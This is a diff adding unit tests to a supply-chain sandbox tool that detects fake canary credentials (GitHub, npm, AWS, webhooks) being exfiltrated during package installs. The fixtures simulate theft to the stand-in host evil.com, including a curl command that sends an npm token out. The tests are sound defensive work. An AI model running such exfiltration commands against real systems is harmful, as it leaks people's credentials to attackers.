@@ -563,6 +563,138 @@ async function runSandboxTests() {
     assertIncludes(playbook, 'honey tokens', 'Playbook should mention honey tokens');
     assertIncludes(playbook, 'malveillant', 'Playbook should mention malveillant');
   });
+
+  // ============================================
+  // STATIC CANARY TOKEN TESTS
+  // ============================================
+
+  console.log('\n=== STATIC CANARY TOKEN TESTS ===\n');
+
+  const {
+    STATIC_CANARY_TOKENS,
+    detectStaticCanaryExfiltration
+  } = require('../../src/sandbox.js');
+
+  test('STATIC-CANARY: STATIC_CANARY_TOKENS has 6 entries with MUADDIB_CANARY values', () => {
+    const keys = Object.keys(STATIC_CANARY_TOKENS);
+    assert(keys.length === 6, 'Should have 6 static canary tokens, got ' + keys.length);
+    for (const [key, value] of Object.entries(STATIC_CANARY_TOKENS)) {
+      assertIncludes(value, 'MUADDIB_CANARY', `Token ${key} should contain MUADDIB_CANARY`);
+    }
+  });
+
+  test('STATIC-CANARY: STATIC_CANARY_TOKENS has expected keys', () => {
+    const expected = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'SLACK_WEBHOOK_URL', 'DISCORD_WEBHOOK_URL'];
+    for (const key of expected) {
+      assert(STATIC_CANARY_TOKENS[key] !== undefined, `Missing key: ${key}`);
+    }
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in http_bodies', () => {
+    const report = { network: { http_bodies: ['stolen=' + STATIC_CANARY_TOKENS.GITHUB_TOKEN] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect exfiltration');
+    assert(result[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
+    assert(result[0].value === STATIC_CANARY_TOKENS.GITHUB_TOKEN, 'Should return the token value');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in dns_queries', () => {
+    const report = { network: { dns_queries: [STATIC_CANARY_TOKENS.NPM_TOKEN + '.evil.com'] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect DNS exfiltration');
+    assert(result[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in http_requests', () => {
+    const report = { network: { http_requests: [
+      { method: 'GET', host: 'evil.com', path: '/steal?key=' + STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID }
+    ] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect URL exfiltration');
+    assert(result[0].token === 'AWS_ACCESS_KEY_ID', 'Should identify AWS_ACCESS_KEY_ID');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in tls_connections', () => {
+    const report = { network: { tls_connections: [
+      { domain: STATIC_CANARY_TOKENS.DISCORD_WEBHOOK_URL + '.evil.com', ip: '1.2.3.4', port: 443 }
+    ] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect TLS exfiltration');
+    assert(result[0].token === 'DISCORD_WEBHOOK_URL', 'Should identify DISCORD_WEBHOOK_URL');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in install_output', () => {
+    const report = { install_output: 'sending ' + STATIC_CANARY_TOKENS.AWS_SECRET_ACCESS_KEY };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect install output exfiltration');
+    assert(result[0].token === 'AWS_SECRET_ACCESS_KEY', 'Should identify AWS_SECRET_ACCESS_KEY');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in filesystem.created', () => {
+    const report = { filesystem: { created: ['/tmp/' + STATIC_CANARY_TOKENS.SLACK_WEBHOOK_URL] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect filesystem exfiltration');
+    assert(result[0].token === 'SLACK_WEBHOOK_URL', 'Should identify SLACK_WEBHOOK_URL');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration finds token in processes.spawned', () => {
+    const report = { processes: { spawned: [
+      { command: 'curl http://evil.com/?t=' + STATIC_CANARY_TOKENS.NPM_TOKEN, pid: 1 }
+    ] } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 1, 'Should detect process exfiltration');
+    assert(result[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration returns empty for clean report', () => {
+    const report = {
+      network: { http_bodies: ['normal data'], dns_queries: ['google.com'], http_requests: [], tls_connections: [] },
+      filesystem: { created: [] },
+      processes: { spawned: [] },
+      install_output: 'npm WARN deprecated'
+    };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length === 0, 'Should return empty for clean report');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration handles null report', () => {
+    const result = detectStaticCanaryExfiltration(null);
+    assert(result.length === 0, 'Should return empty for null report');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration handles empty report', () => {
+    const result = detectStaticCanaryExfiltration({});
+    assert(result.length === 0, 'Should return empty for empty report');
+  });
+
+  test('STATIC-CANARY: detectStaticCanaryExfiltration detects multiple tokens at once', () => {
+    const report = { network: {
+      http_bodies: ['token=' + STATIC_CANARY_TOKENS.GITHUB_TOKEN + '&secret=' + STATIC_CANARY_TOKENS.AWS_SECRET_ACCESS_KEY]
+    } };
+    const result = detectStaticCanaryExfiltration(report);
+    assert(result.length >= 2, 'Should detect 2+ tokens, got ' + result.length);
+    const tokenNames = result.map(r => r.token);
+    assert(tokenNames.includes('GITHUB_TOKEN'), 'Should include GITHUB_TOKEN');
+    assert(tokenNames.includes('AWS_SECRET_ACCESS_KEY'), 'Should include AWS_SECRET_ACCESS_KEY');
+  });
+
+  test('STATIC-CANARY: canary_exfiltration finding adds +50 to score', () => {
+    // Verify the scoring logic: scoreFindings returns base score,
+    // then canary_exfiltration findings add +50 each in runSandbox
+    const baseReport = { network: { dns_queries: ['evil.com'] } };
+    const { score: baseScore } = scoreFindings(baseReport);
+    assert(baseScore === 20, 'Base DNS score should be 20, got ' + baseScore);
+    // In runSandbox, if a canary is also found, finalScore = baseScore + 50 = 70
+    const mockFindings = [
+      { type: 'suspicious_dns', severity: 'HIGH', detail: 'DNS to evil.com', evidence: 'evil.com' },
+      { type: 'canary_exfiltration', severity: 'CRITICAL', detail: 'Token stolen', evidence: 'MUADDIB_CANARY_GITHUB_f8k3t0k3n' }
+    ];
+    const finalScore = Math.min(100, mockFindings.reduce((s, f) => {
+      if (f.type === 'canary_exfiltration') return s + 50;
+      return s;
+    }, baseScore));
+    assert(finalScore === 70, 'Final score should be base(20) + canary(50) = 70, got ' + finalScore);
+  });
 }
 
 module.exports = { runSandboxTests };
